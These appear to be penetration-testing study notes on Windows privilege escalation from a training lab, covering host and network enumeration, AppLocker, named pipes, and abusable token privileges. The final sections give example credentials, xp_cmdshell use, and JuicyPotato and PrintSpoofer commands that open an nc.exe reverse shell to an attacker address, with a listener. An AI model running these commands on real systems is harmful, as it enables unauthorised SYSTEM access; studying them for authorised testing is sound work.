# 🧭 Situational Awareness 

Situational awareness is essential during penetration tests or any security assessment. Before attempting privilege escalation, we must fully understand the host, its environment, protections, and its network placement. This allows us to make informed, proactive decisions rather than reactive ones.

## 🌐 Network Information

Gathering network information early can reveal:

* **Dual-homed systems** (hosts with multiple interfaces on different networks)
* **Potential lateral movement paths**
* **Domain infrastructure details**
* **Recently communicated hosts** (from ARP tables)
* **Routing behavior**

This information may help directly or indirectly in privilege escalation or in pivoting deeper into the environment.

## 🔌 Interface / IP / DNS Enumeration

### `ipconfig /all` Output Highlights

| Interface                         | IP Address    | Notes                        |
| --------------------------------- | ------------- | ---------------------------- |
| **Ethernet1**                     | 192.168.20.56 | Static, DNS = 8.8.8.8        |
| **Ethernet0**                     | 10.129.43.8   | DHCP, DNS = 1.1.1.1, 8.8.8.8 |
| Multiple ISATAP & Teredo adapters | —             | IPv6 tunneling, disconnected |

### Key Observations

* The host is **dual-homed**:

  * **192.168.20.0/24**
  * **10.129.0.0/16**
* Appears to belong to the **.htb domain** (DNS suffix).
* Two different gateways:

  * 10.129.0.1
  * 192.168.20.1
* Could serve as a **pivot point** between network segments.

## 🧩 ARP Table Enumeration

### `arp -a`

Shows recently communicated hosts for each interface.

* On **10.129.43.8**, several dynamic ARP entries → potential targets for lateral movement.
* On **192.168.20.56**, mostly broadcast/multicast entries → minimal local activity.

### Why ARP Matters

* Identifies **active hosts** the machine talks to.
* Indicates systems admins may use (e.g., RDP/WinRM connections).
* Helps map reachable systems without scanning (stealthier).


## 🧭 Routing Table Analysis

### Key Observations from `route print`

* Two default routes exist:

  * Primary: **10.129.0.1** (metric 25)
  * Secondary: **192.168.20.1** (metric 271)
* Confirms the system is dual-homed and prefers the **10.129.x.x** interface.
* IPv6 routing also enabled.

### Why This Matters

* Defines where traffic exits the host.
* Helps identify pivoting routes.
* Useful for SOCKS tunnels, proxies, and redirectors during escalation or lateral movement.


## 🛡️ Windows Defender Status

### `Get-MpComputerStatus` Highlights

| Feature                   | Status     |
| ------------------------- | ---------- |
| Antivirus Enabled         | ✔          |
| Antispyware Enabled       | ✔          |
| Real-Time Protection      | ❌ Disabled |
| On-Access Protection      | ❌ Disabled |
| Network Inspection System | ❌ Disabled |

### Implications

* Defender is installed but **most active protections are disabled**.
* May permit unsigned tools or enumeration scripts without alerting.
* Still must consider signature-based detection.

## 📦 AppLocker Policy Enumeration

### `Get-AppLockerPolicy -Effective`

Default rules include:

* Allow all **signed packaged apps**
* Allow execution of files in:

  * `%PROGRAMFILES%\*`
  * `%WINDIR%\*`
* Administrators can run **all files/scripts**
* Everyone can run signed installers & scripts in specific directories

### Notable Finding

* Execution **outside Program Files/Windows** may be restricted for non-admin users.
* Generic paths like `C:\Users\*\Desktop\tool.exe` may be blocked.

## 🧪 Testing AppLocker Enforcement

### Command

```powershell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\cmd.exe -User Everyone
```

### Result

```
PolicyDecision: Denied
MatchingRule: c:\windows\system32\cmd.exe
```

### Meaning

* Even though cmd.exe is in the Windows directory, its execution may be restricted for **Everyone**.
* Indicates the presence of **AppLocker enforcement** that must be bypassed.

---

Below is a clean, organized **Markdown note set** summarizing the key concepts and commands from your Windows privilege‑escalation initial enumeration section.
You can drop this directly into Obsidian/Notion/CherryTree/etc.

---

# Initial Enumeration Notes

## 🎯 Goal

After obtaining a low‑privileged shell on a Windows host, enumerate the system to identify paths to escalate to:

* **NT AUTHORITY\SYSTEM**
* **Local Administrator**
* **Any user in the Administrators group**
* **Domain users with local admin**
* **Domain Admins**

Enumeration provides situational awareness to identify vulnerabilities, misconfigurations, and credential exposure.

## 🔍 Key Areas of Windows Enumeration

## 1. **System Information**

### 🔧 Tasklist — Running Processes & Services

```cmd
tasklist /svc
```

* Identify unusual processes.
* Look for services running as **SYSTEM** or **Administrator**.
* Non‑standard apps = potential escalation (e.g., FileZilla, custom services).

### 📝 Know common Windows processes:

* `smss.exe`
* `csrss.exe`
* `winlogon.exe`
* `lsass.exe`
* `svchost.exe`

## 2. **Environment Variables**

```cmd
set
```

### Look for:

* `PATH` misconfigurations → DLL hijacking potential.
* Mapped home drives or shares.
* Roaming profiles: persistence via `Startup` folder.

## 3. **Detailed System Configuration**

### Systeminfo

```cmd
systeminfo
```

Reveals:

* OS + version + build
* Patch level (important for exploit discovery)
* Boot time (long uptime → likely unpatched)
* Manufacturer (VM detection)
* Hotfixes (unless hidden)
* Network adapters

## 4. **Patch & Hotfix Enumeration**

If `systeminfo` hides hotfixes:

### WMIC:

```cmd
wmic qfe
```

### PowerShell:

```powershell
Get-HotFix
```

Compare missing patches against known privilege-escalation CVEs.

## 5. **Installed Software**

### WMIC:

```cmd
wmic product get name
```

### PowerShell:

```powershell
Get-WmiObject -Class Win32_Product | select Name, Version
```

What to look for:

* Software with known exploits.
* Tools storing credentials (e.g., FileZilla, Putty, SQL clients).
* Services running vulnerable or outdated versions.

## 6. **Network Information**

### Netstat

```cmd
netstat -ano
```

Identify:

* Internal‑only services exploitable from local shell.
* High‑value ports: `1433` (SQL), `21` (FTP), `80`, `445`, `3389`.

## 7. **User & Group Enumeration**

### Logged‑in Users

```cmd
query user
```

### Current User

```cmd
whoami
echo %USERNAME%
```

### User Privileges

```cmd
whoami /priv
```

Key escalation‑relevant privileges:

* **SeImpersonatePrivilege**
* **SeAssignPrimaryTokenPrivilege**
* **SeBackupPrivilege**
* **SeRestorePrivilege**

#### Group Memberships

```cmd
whoami /groups
```

## 8. **Local Users**

```cmd
net user
```

What to check:

* Reused naming patterns (e.g., `bob` vs `bob_adm`)
* Presence of service accounts
* Users with admin‑like names


## 9. **Local Groups**

```cmd
net localgroup
```

Inspect members of high‑priv groups:

```cmd
net localgroup administrators
```

Look for:

* Non‑standard users
* Domain users with local admin access

## 10. **Password & Account Policy**

```cmd
net accounts
```

Reveals:

* Password length
* Lockout settings
* Password expiration
* Weak policy ⇒ password spraying opportunity


## 🧭 What to Look For During Enumeration

### 🔓 **Misconfigurations**

* Writable directories in PATH
* Services running as SYSTEM but with weak permissions
* Unquoted service paths
* Startup folder access

### 🔑 **Credential Exposure**

* User home directories containing:

  * `.txt` or `.xlsx` files
  * Scripts with passwords
  * Private keys
  * Saved session files

### 🕵️ **Escalation Indicators**

* Long system uptime → likely unpatched
* Tools like SQL Server, FileZilla, VMware Tools
* Privileged tokens (Impersonation)
* Logged‑in privileged users

---

# Communication With Processes

## 1. Overview

Privilege escalation often involves analyzing running processes and how they communicate. Even non-administrator processes can provide paths to higher privileges—especially if they run with impersonation privileges or insecure configurations.


## 2. Access Tokens (Windows)

* Access tokens define the **security context** of a process or thread.
* A token contains:

  * User identity
  * Privileges
  * Group memberships
* When a user logs in, Windows issues a token.
* Every process the user interacts with receives a copy of this token to determine access rights.

## 3. Enumerating Network Services

Processes frequently communicate through **network sockets** (DNS, HTTP, SMB, etc.).

### 🔍 Using `netstat` to View Active Connections

```cmd
netstat -ano
```

Key fields:

* **Local Address:** where service is listening
* **Foreign Address:** remote connection target
* **PID:** process associated with the connection
* **State:** LISTENING, ESTABLISHED, etc.

### 🔑 What to Look For

Look for services listening on:

* **127.0.0.1** or **::1** (loopback interfaces)
* **NOT listening** on:

  * The real IP address
  * 0.0.0.0 (all interfaces)

Services bound only to localhost are often **poorly secured** because admins assume “no one external can access them.”

### Example: Vulnerable Local Port

* Port **14147** → FileZilla Admin interface
* Potential to:

  * Extract stored FTP credentials
  * Create an FTP share pointing to `C:\`
  * Gain access as the FileZilla service account (often with high privileges)


## 4. More Examples of Network-Based Privilege Escalation

### 🔸 Splunk Universal Forwarder

* Default configuration: **no authentication**
* Allows remote deployment of applications
* Runs as **SYSTEM**
* Can lead to **remote code execution (RCE)**

### 🔸 Erlang Port (25672)

Used by distributed systems such as:

* **RabbitMQ**
* **CouchDB**
* **SolarWinds**

Issues:

* Uses a **cookie** for authentication
* Cookies often weak:

  * Example: RabbitMQ uses default cookie `rabbit`
* Cookie stored in world-readable config files → privilege escalation


## 5. Named Pipes (Inter-Process Communication)

Named pipes allow processes to communicate via shared memory.

### Types

* **Anonymous pipes:** Simple, one-way
* **Named pipes:** Two-way communication, persistent name (e.g. `\\.\pipe\msagent_12`)

### Named Pipes in Cobalt Strike

Example workflow:

1. Beacon creates pipe: `\\.\pipe\msagent_12`
2. Beacon injects command into another process
3. Output written to the pipe
4. Server reads from pipe and displays results

Attackers often rename pipes to look legitimate (e.g., `mojo`, similar to Chrome's Mojo IPC).

## 6. Enumerating Named Pipes

### Using Sysinternals `PipeList`

```cmd
pipelist.exe /accepteula
```

Shows:

* Pipe name
* Number of instances
* Max allowed instances

### Using PowerShell

```powershell
gci \\.\pipe\
```

## 7. Checking Pipe Permissions

Use **Accesschk** to view DACLs (permissions).

### Example: LSASS named pipe

```cmd
accesschk.exe /accepteula \\.\Pipe\lsass -v
```

Expected:

* Only **Administrators** have full access
* Everyone else: limited read/write attributes

---

# 8. Named Pipe Privilege Escalation Example

## WindscribeService Example

### Step 1: Find writable pipes

```cmd
accesschk.exe -w \pipe\* -v
```

### Step 2: Inspect specific pipe

```cmd
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

Finding:

* `Everyone` has **FILE_ALL_ACCESS**
* Means any authenticated user can **read, write, and execute** operations on the pipe

### Result:

This allows an attacker to:

* Interact directly with the service
* Abuse insecure functionality
* Execute code as the **service account**
* Often escalates to **SYSTEM**

---

# Windows Privileges Overview

## **1. What Are Windows Privileges?**

* Privileges = rights allowing specific system-level actions (load drivers, debug processes, backup files, impersonate users, etc.).
* Different from *access rights*, which control access to objects (files, registry, services).
* Privileges are stored in local/domain security databases and added to the **access token** at login.
* Most privileges start **Disabled** and must be enabled before use.

### **Why We Care**

* Many privileges can be **abused for privilege escalation** to:

  * Local Administrator
  * SYSTEM
  * Domain Admin


## **2. Windows Authorization Basics**

* Windows uses **Security Principals** (users, computers, groups, processes).
* Each principal has a **SID** (Security Identifier).
* Access to an object is decided by comparing:

  * Your **access token** (User SID, Group SIDs, Privileges)
  * Object’s **DACL** (access rights defined in ACEs)

**Attack Goal:**
Find a way to insert yourself into this authorization chain or abuse privileges to elevate.


## **3. Privileged Groups (High-Value Targets)**

### **🔥 Top Escalation-Relevant Groups**

| Group                                                  | Why Important                                               |
| ------------------------------------------------------ | ----------------------------------------------------------- |
| **Administrators / Domain Admins / Enterprise Admins** | Full control everywhere                                     |
| **Backup Operators**                                   | Can backup SAM, NTDS.dit, registry → basically Domain Admin |
| **Server Operators**                                   | Manage services, SMB, backups                               |
| **Print Operators**                                    | Can load malicious printer drivers on DCs                   |
| **Hyper-V Admins**                                     | Can control virtual DCs → effectively Domain Admin          |
| **Account Operators**                                  | Modify non-protected accounts/groups                        |
| **Remote Desktop Users**                               | Often granted logon rights → lateral movement               |
| **Remote Management Users**                            | PSRemoting access to DCs                                    |
| **DNS Admins**                                         | Can load DLLs → potential SYSTEM execution                  |

⚠ Many orgs mistakenly add “normal” users to these groups → easy escalation.

## **4. Key Privileges to Know (Most Abusable)**

### **🔥 High-Risk Privileges (commonly exploited)**

| Privilege                         | Use / Abuse                                       |
| --------------------------------- | ------------------------------------------------- |
| **SeImpersonatePrivilege**        | Potato attacks (Juicy/PrintSpoofer/etc.) → SYSTEM |
| **SeDebugPrivilege**              | Open any process → inject → SYSTEM                |
| **SeBackupPrivilege**             | Copy protected files (SAM, SYSTEM, NTDS.dit)      |
| **SeRestorePrivilege**            | Overwrite protected files                         |
| **SeTakeOwnershipPrivilege**      | Take ownership of any file or object              |
| **SeLoadDriverPrivilege**         | Load unsigned kernel drivers                      |
| **SeTcbPrivilege**                | “Act as part of OS” — extremely dangerous         |
| **SeCreateSymbolicLinkPrivilege** | Abuse symlink races                               |
| **SeShutdownPrivilege**           | Can shut down DCs (DoS)                           |



## **5. How to View Assigned Privileges**

```cmd
whoami /priv
```

### **Admin (Elevated)**

* Many privileges assigned but mostly **Disabled** until enabled.
* Examples: SeDebugPrivilege, SeBackupPrivilege, SeLoadDriverPrivilege.

### **Admin (Non-Elevated)**

* Privileges appear restricted → **UAC filtering**.

### **Standard User**

* Usually only:

  * SeChangeNotifyPrivilege
  * SeIncreaseWorkingSetPrivilege

## **6. Elevation Concepts**

* Privileges may be:

  * **Assigned but Disabled** → need to be programmatically enabled.
  * **Assigned via Group Membership**
  * **Restricted by UAC** until elevated console is used.

* Windows has no built-in command to enable privileges → requires:

  * PowerShell scripts
  * Custom C#/C++ executables
  * Token adjustment tools

## **7. Detection (Defensive Note)**

* Event ID **4672**: “Special privileges assigned to new logon”

  * Great for detecting accounts suddenly receiving strong privileges.
  * Should alert if unusual accounts have admin-level privileges.

## **8. What to Look For During Enumeration**

Always check:

### **1. Privilege list**

```
whoami /priv
```

Especially:

* SeImpersonate
* SeDebug
* Backup/Restore
* TakeOwnership

### **2. Group membership**

```
whoami /groups
net user <username>
```

Look for:

* Backup Operators
* Server Operators
* DNS Admins
* RDP/Remote Management Users

### **3. UAC status**

* Token splitting can hide privileges until elevated.

### **4. Local & domain GPO privilege assignments**

* Can override local rights.


---

# SeImpersonate & SeAssignPrimaryToken

## **1. Overview**

Windows processes run with **access tokens** that identify:

* User account
* Groups
* Privileges

These tokens are stored in memory and are **not secure objects** — they can be impersonated if a process has the right privileges.

Two of the most important token-related privileges are:

* **SeImpersonatePrivilege**
* **SeAssignPrimaryTokenPrivilege**

These often allow escalation from **service account → SYSTEM**.


## **2. What SeImpersonatePrivilege Does**

**SeImpersonatePrivilege** allows a process to **impersonate another user's token** after that user has authenticated to it.

### ✔ Legitimate Use Example

* Services impersonating client accounts to access resources
* API: `CreateProcessWithTokenW`

### ✔ Why It's Dangerous

Attackers can:

1. Trick a SYSTEM process to authenticate to attacker-controlled server.
2. Capture SYSTEM token.
3. Create a new SYSTEM process.

This is the basis for most **Potato-style exploits**.


## **3. What SeAssignPrimaryTokenPrivilege Does**

Allows a process to **assign a primary token to a new process**.

### Key points:

* Paired with SeIncreaseQuotaPrivilege
* Used with API: `CreateProcessAsUser`
* Rarely granted except to service accounts
* Also abusable for escalation if present

## **4. Common Attack Scenario**

You gain RCE through:

* Web shell (ASP.NET)
* Jenkins RCE
* MSSQL xp_cmdshell
* Misconfigured service

Then check:

```cmd
whoami /priv
```

If you see:

```
SeImpersonatePrivilege   Enabled
```

→ You can almost always escalate to SYSTEM.

## **5. Example Walkthrough: MSSQL Service Abuse**

## **5.1 Connecting to SQL Server**

```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

Credentials example:

```
sql_dev : Str0ng_P@ssw0rd!
```

## **5.2 Enabling xp_cmdshell**

```sql
SQL> enable_xp_cmdshell
```

---

## **5.3 Confirm Account Context**

```sql
SQL> xp_cmdshell whoami
```

Output example:

```
nt service\mssql$sqlexpress01
```

## **5.4 Checking Privileges**

```sql
SQL> xp_cmdshell whoami /priv
```

Look for:

```
SeImpersonatePrivilege        Enabled
SeAssignPrimaryTokenPrivilege Disabled/Enabled
```

If SeImpersonate is present → **JuicyPotato** or **PrintSpoofer** is possible.


## **6. JuicyPotato (DCOM / NTLM Reflection Abuse)**

## **6.1 Command Example**

```sql
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

Flags:

* `-l` → listening COM port
* `-p` → program to run
* `-a` → arguments
* `-t *` → try all token creation methods

If successful:

```
NT AUTHORITY\SYSTEM
```


# **7. PrintSpoofer (Windows 10 / Server 2019+)**

JuicyPotato does **not** work on newer Windows builds.

PrintSpoofer abuses the **Print Spooler** to impersonate SYSTEM.

## **7.1 Command Example**

```sql
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
```
nc -lnvp 8443
```
If successful:

```
nt authority\system
```

---
